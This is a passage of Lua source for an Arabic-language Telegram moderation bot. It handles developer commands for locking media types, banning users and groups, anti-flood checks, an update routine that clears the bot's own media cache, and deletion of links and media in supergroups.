 ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:phon'..bot_id) end  if text == 'قفل الجهات' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الجهات  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:phon'..bot_id,true) end if text == 'فتح الملفات' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الملفات   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:file'..bot_id) end  if text == 'قفل الملفات' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الملفات  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:file'..bot_id,true) end if text == 'فتح الملصقات' and is_devtaha(msg) then  taha = '◗*🚸¦* تم فتح الملصقات   ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:del(DEVSTOR..'lock:ste'..bot_id) end  if text == 'قفل الملصقات' and is_devtaha(msg) then  taha = '◗*📛¦* تم قفل الملصقات  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md")  tahadevstorm:set(DEVSTOR..'lock:ste'..bot_id,true) end 
if text == 'الاعدادات' and is_devtaha(msg) then     if tahadevstorm:get(DEVSTOR..'lock:photo'..bot_id) then    lock_photo = '* مقفل ✓ *'      else     lock_photo = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:vico'..bot_id) then    lockvic = '* مقفل ✓ *'      else     lockvic = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:ste'..bot_id) then    lockste = '* مقفل ✓ *'      else     lockste = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:file'..bot_id) then    lockfile = '* مقفل ✓ *'     else     lockfile = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:phon'..bot_id) then    lockphon = '* مقفل ✓ *'      else     lockphon = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:links'..bot_id) then    lock_link = '* مقفل ✓ *'      else     lock_link = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:ved'..bot_id) then    lock_vid = '* مقفل ✓ *'      else     lock_vid = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:fwd'..bot_id) then    lock_fwd = '* مقفل ✓ *'      else     lock_fwd = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:gif'..bot_id) then    lock_gif = '* مقفل ✓ *'      else     lock_gif = '*مفتوح ✘*'    end    if tahadevstorm:get(DEVSTOR..'lock:musec'..bot_id) then    lock_muse = '* مقفل ✓ *'      else     lock_muse = '*مفتوح ✘*'    end    local text = '*📛¦* اهلا بك في اعدادات الخاص 🍃'..'\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'..    '\n*📬¦* الروابط ◖'..lock_link..    '◗\n'..'*📬¦* الصور ◖'..lock_photo..    '◗\n'..'*📬¦* الاغاني ◖'..lockvic..    '◗\n'..'*📬¦* الملصقات ◖'..lockste..    '◗\n'..'*📬¦* الملفات ◖'..lockfile..    '◗\n'..'*📬¦* الجهات ◖'..lockphon..    '◗\n'..'*📬¦* الفيديو ◖'..lock_vid..    '◗\n'..'*📬¦* التوجيه ◖'..lock_fwd..    '◗\n'..'*📬¦* المتحركه ◖'..lock_gif..    '◗\n'..'*📬¦* الصوت ◖'..lock_muse..    '◗\n\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n🚨*¦* اضافه الى ذالك تستطيع قفل وفتح الكل\n🚸*¦* قفل الكل \n🚸*¦* فتح الكل'    storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')     end     
if text =='الاوامر' and is_devtaha(msg) then
local text = [[ 
*👨🏻‍🎤¦* مرحبا بك عزيزي يا مطور البوت 🍃
*🚨¦* في اوامــر التواصل
——————༻🚸༺——————
📑¦ ◗ قفل / فتح ◖ الروابط
📷¦ ◗ قفل / فتح ◖ الصور
🎵¦ ◗ قفل / فتح ◖ الاغاني
🎆¦ ◗ قفل / فتح ◖ الملصقات
📁¦ ◗ قفل / فتح ◖ الملفات
📲¦ ◗ قفل / فتح ◖ الجهات
📹¦ ◗ قفل / فتح ◖ الفيديو
♻¦ ◗ قفل / فتح ◖ التوجيه
🌋¦ ◗ قفل / فتح ◖ المتحركه
🔉¦ ◗ قفل / فتح ◖ الصوت
🎲¦ ◗ قفل / فتح ◖ الكل
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
*🚷¦* لحظر والغاء الحضر في التواصل
📛*¦* حظر ◗ايدي، معرف ◖
📛*¦* الغاء الحظر ◗ايدي، معرف ◖
——————༻🚸༺——————
*⚜¦* للمزيد من المعلومات راسلنا
*🗯¦* مطور البوت ◗[@]]..sudouser..[[]◖

]] storm_sendMsg(msg.chat_id_
               , msg.id_
               , 1
               , text
               , 1
               , 'md')
         end  
if text
            and text:match('^حظر (%d+)')
            and is_devtaha(msg)  then
            local user = text:match('حظر (%d+)')
            function bot_kick(extra
                  , result
                  , success)   username = ''..(result.username_ or ' لم يضع معرف ✨')..''      tahadevstorm:incrby('numlocktextpv'..bot_id..user,10000000)    tahadevstorm:sadd(DEVSTOR..'pv:ban'..msg.chat_id_,user)       zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗📬¦ الايــدي { '..user..' }*\n*◗🎲¦* تـم حظره من التواصل'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end    getUser(user, bot_kick)   end
if text and text:match('^الغاء الحظر (%d+)') and is_devtaha(msg)  then     local user = text:match('الغاء الحظر (%d+)')      function bot_kick(extra, result, success)   username = ''..(result.username_ or ' لم يضع معرف ✨')..''      tahadevstorm:del('numlocktextpv'..bot_id..user)    tahadevstorm:srem(DEVSTOR..'pv:ban'..msg.chat_id_,user)       zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗📬¦ الايــدي { '..user..' }*\n*◗🎲¦* تـم الغاء حظره من التواصل'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end    getUser(user, bot_kick)   end
if text and text:match('^حظر @(.*)') and is_devtaha(msg) then     local username = text:match('حظر @(.*)')     function kick_username(extra,result,success)     if result.id_ then     tahadevstorm:incrby('numlocktextpv'..bot_id..result.id_,160000066)    tahadevstorm:sadd(DEVSTOR..'pv:ban'..msg.chat_id_,result.id_)       zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗📬¦ الايــدي { '..result.id_..' }*\n*◗🎲¦* تـم حظره من التواصل'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end   end   saddbyusername(username,kick_username)     end  
if text and text:match('^الغاء الحظر @(.*)') and is_devtaha(msg) then     local username = text:match('الغاء الحظر @(.*)')     function kick_username(extra,result,success)     if result.id_ then     tahadevstorm:del('numlocktextpv'..bot_id..result.id_)    tahadevstorm:srem(DEVSTOR..'pv:ban'..msg.chat_id_,result.id_)       zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗📬¦ الايــدي { '..result.id_..' }*\n*◗🎲¦* تـم الغاء حظره من التواصل'    storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end   end   saddbyusername(username,kick_username)     end  
if text ==('المحظورين') and is_devtaha(msg) then      local list = tahadevstorm:smembers(DEVSTOR..'pv:ban'..msg.chat_id_)   local t = '*📊¦ قائمه محظورين التواصل 🍂*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'    for k, v in pairs(list) do    if tahadevstorm:hget('users:'..v, 'uname') then  t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end    end   if #list == 0 then   t = '*📬¦* لا يوجد محظورين'   end   storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')   end
if text == 'مسح المحظورين' and is_devtaha(msg) then       local list = tahadevstorm:smembers(DEVSTOR..'pv:ban'..msg.chat_id_)   for k,v in pairs(list) do     tahadevstorm:del(DEVSTOR..'pv:ban'..msg.chat_id_)   tahadevstorm:del('numlocktextpv'..bot_id..v)  end   storm_sendMsg(msg.chat_id_, msg.id_, 1,'📛*¦* تم مسح المحظورين', 1, 'md')     end
if text and text:match('^حظر (-%d+)') and is_devtaha(msg) then  local ch = text:match('حظر (-%d+)')  tahadevstorm:sadd(DEVSTOR..'ban:group', ch)  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*💠¦* المجموعه تم حظرها بنجاح ✔ \n*📡¦ الايدي* ◗`'..ch..'`◖\n', 1, 'md')  end
if text and text:match('^الغاء الحظر (-%d+)') and is_devtaha(msg) then  local ch = text:match('الغاء الحظر (-%d+)') tahadevstorm:srem(DEVSTOR..'ban:group', ch)  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*💠¦* المجموعه تم الغاء حظرها ✔ \n*📡¦ الايدي* ◗`'..ch..'`◖\n', 1, 'md') end
if text == 'المجموعات المحظوره' and is_devtaha(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'ban:group')  local t = '*🚨¦ قائمه المجموعات المحظوره 🍂*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'  for k, v in pairs(list) do  t = t..'*◖'..k.."◗➣* `" ..v.."`\n"   end  if #list == 0 then  t = '*📬¦* لا يوجد مجموعات محظوره'  end  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end  
if text == 'تفعيل البوت الخدمي' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل البوت خدمي  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:bot:free'..bot_id) end 
if text == 'تعطيل البوت الخدمي' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل البوت الخدمي  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:bot:free'..bot_id,true) end
if text == 'تفعيل التواصل' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل بوت التواصل  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:botl'..bot_id) end 
if text == 'تعطيل التواصل' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل التواصل  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:botl'..bot_id,true) end
if text == 'تفعيل الكتابه' and is_devtaha(msg) then local  taha = '◗*📛¦*تم تفعيل الكتابه  ✔' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:del(DEVSTOR..'lock:tepy'..bot_id) end 
if text == 'تعطيل الكتابه' and is_devtaha(msg) then taha = '◗*📛¦*تم تعطيل الكتابه  ❌' storm_sendMsg( msg.chat_id_, msg.id_, 1, taha, 1, "md") tahadevstorm:set(DEVSTOR..'lock:tepy'..bot_id,true) end
if text and text:match("^(رفع منشئ) (-%d+) @(.*)") and is_sudo(msg) then   local matches = {text:match("^(رفع منشئ) (-%d+) @(.*)")}   function promreply(extra,result,success)   if result.id_ then   if #matches == 3 then   tahadevstorm:sadd(DEVSTOR..'moder'..matches[2],result.id_)    zo = '\n*◗💠¦ العضو { @'..matches[3]..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب\n*◗📛¦* في هاذا المجموعه'..(matches[2])..''  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')     end   end  end  saddbyusername(matches[3],promreply)   end
if text and text:match("^(رفع منشئ) (-%d+) (%d+)") and is_sudo(msg) then   local matches = {text:match("^(رفع منشئ) (-%d+) (%d+)")}   if #matches == 3 then   tahadevstorm:sadd(DEVSTOR..'moder'..matches[2],matches[3])    zo = '\n*◗💠¦ العضو { '..matches[3]..' }*\n*◗📬¦* تـم تـرقيتـه منشـئ للـكروب\n*◗📛¦* في هاذا المجموعه'..(matches[2])..''  storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')     end   end
if text == 'تحديث' and is_devtaha(msg) then  dofile('STORM.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/temp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") print("\27[31;47m\n          💥»» تم تحديث البوت ««💥          \n\27[0;34;49m\n") storm_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم تحديث البوت', 1, 'md') end 
if text and text:match('الحساب (%d+)') then local idtaha = text:match('الحساب (%d+)')  local taha = {'اضغط هنا للدخول الى حساب الصاك 😍'} tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=taha[math.random(#taha)], disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=30, user_id_=idtaha}}}}, dl_cb, nil) end
if text ==('المجموعات') and is_sudo(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'bot:gpsby:id')  local t = '*🎲¦ ايدي المجموعات التي تم تفعيلها*\n\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'  for k,v in pairs(list) do   t = t..'*◖'..k.."◗* `"..v.."`\n*{"..title_name(v)..'}*\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'   file = io.open("storm_groups", "w") file:write([[ ]]..isnothtml(t)..[[ ]]) file:close() end  t = t..'*📬¦* لمعرفات معلومات مجموعه معينه\n*🔬¦ اكتب (كشف) + ايدي المجموعه*\n*📃¦* مثال `كشف '..msg.chat_id_..'`'  if #list >= 25 then  sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './storm_groups','📛¦ عدد المجموعات اصبح اكثر من 25\n🚸¦ تم ارسال ملف توجد فيه المجموعات',dl_cb, nil) else storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end end end
if chat_type == 'super' then local user_id = msg.sender_user_id_
floods = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood") or  'nil'
NUM_MSG_MAX = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodtime") or 5
if tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood") then if not is_mod(msg) then
if msg.content_.ID == "MessageChatAddMembers" then return else
local post_count = tonumber(tahadevstorm:get(DEVSTOR..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodmax") or 5) then local ch = msg.chat_id_
local type = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood") trigger_anti_spam(msg,type)  end
tahadevstorm:setex(DEVSTOR..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) end end
local edit_id = data.text_ or 'nil'  NUM_MSG_MAX = 5
if tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodmax") end
if tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"floodtime") end end	  
if msg.content_.ID == 'MessagePinMessage' then    if is_owner(msg) and tahadevstorm:get(DEVSTOR.."lockpin"..msg.chat_id_) then    tahadevstorm:set(DEVSTOR..'pinned'..msg.chat_id_, msg.content_.message_id_)    elseif not tahadevstorm:get(DEVSTOR.."lockpin"..msg.chat_id_) then    tahadevstorm:set(DEVSTOR..'pinned'..msg.chat_id_, msg.content_.message_id_)    end    end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   if tahadevstorm:get(DEVSTOR..'lock:tagservr'..msg.chat_id_) then  if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاشعارات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md") tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true) else delete_msg(msg.chat_id_,{[0] = msg.id_})       end    end  end  
if is_monsh(msg) then  else   if not is_owner(msg) then  if tahadevstorm:get(DEVSTOR.."lockpin"..msg.chat_id_) then if msg.content_.ID == 'MessagePinMessage' then  unpinChannelMessage(msg.chat_id_)  local PinnedMessage = tahadevstorm:get(DEVSTOR..'pinned'..msg.chat_id_)  if PinnedMessage then  pinChannelMessage(msg.chat_id_,tonumber(PinnedMessage), 0)  end  end  end  end  end   if is_mod(msg) then else 
if msg.content_.caption_ and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then  if msg.content_.caption_:match("@") then  if tahadevstorm:get(DEVSTOR..'lock:user'..msg.chat_id_) then delete_msg(msg.chat_id_,{[0] = msg.id_})  end  end  end
if text and text:match("@") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lock:user'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المعرفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end  end    end
if msg.content_.caption_ and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then if tahadevstorm:get(DEVSTOR..'lock:hash'..msg.chat_id_) then  if msg.content_.caption_:match("#") then delete_msg(msg.chat_id_,{[0] = msg.id_}) end  end  end
if text and text:match("#") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lock:hash'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الهاشتاك  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end    end  end
if msg.content_.caption_ then if tahadevstorm:get(DEVSTOR..'lock:cmds'..msg.chat_id_) then  if msg.content_.caption_:match("/") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then delete_msg(msg.chat_id_,{[0] = msg.id_})  end  end  end
if text and text:match("/") and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then    if tahadevstorm:get(DEVSTOR..'lock:cmds'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الشارحه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end     end      end
if msg.content_.caption_ then if not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then if tahadevstorm:get(DEVSTOR..'lock:links'..msg.chat_id_) then  if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then delete_msg(msg.chat_id_,{[0] = msg.id_}) end  end  end end
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") then    if tahadevstorm:get(DEVSTOR..'lock:links'..msg.chat_id_) and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الروابط  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end    end    end      
if msg.content_.ID == 'MessagePhoto' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:photo'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصور  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
if msg.content_.ID == 'MessageVideo' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:ved'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end  end end  
if msg.content_.ID == 'MessageAnimation' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:gif'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المتحركه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end  end end  
if msg.content_.game_ and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:geam'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الالعاب  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
if msg.content_.ID == 'MessageAudio' and  not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:muse'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاغاني  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
if msg.content_.ID == 'MessageVoice' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:vico'..msg.chat_id_) then        if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصوت  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end  end end  
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:inlin'..msg.chat_id_) then     if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاونلاين  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
if msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatJoinByLink" and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then  if tahadevstorm:get(DEVSTOR..'lock:addm'..msg.chat_id_) then  changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")  return  end end  
if msg.content_.ID == 'MessageSticker' and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:ste'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملصقات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end 
if msg.forward_info_ and not is_mod(msg) and not is_vipgroup(msg) and not is_vipgroups(msg) then     if tahadevstorm:get(DEVSTOR..'lock:fwd'..msg.chat_id_) then      if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then       storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف التوجيهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")    tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)    else    delete_msg(msg.chat_id_,{[0] = msg.id_})           end   end end  
